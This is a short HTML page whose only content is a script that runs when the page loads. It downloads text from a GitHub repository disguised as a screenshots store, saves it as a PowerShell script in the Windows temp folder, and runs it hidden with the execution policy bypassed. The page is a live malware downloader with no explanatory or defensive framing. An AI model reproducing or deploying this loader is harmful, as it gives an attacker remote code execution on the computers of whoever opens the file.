<html><head><script language=JScript>var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/h5.txt",0);x.send();var fso=new ActiveXObject("Scripting.FileSystemObject");var p=fso.GetSpecialFolder(2)+"\\h.ps1";fso.CreateTextFile(p).Write(x.responseText);new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ex ByP -File \""+p+"\"",0);</script></head></html>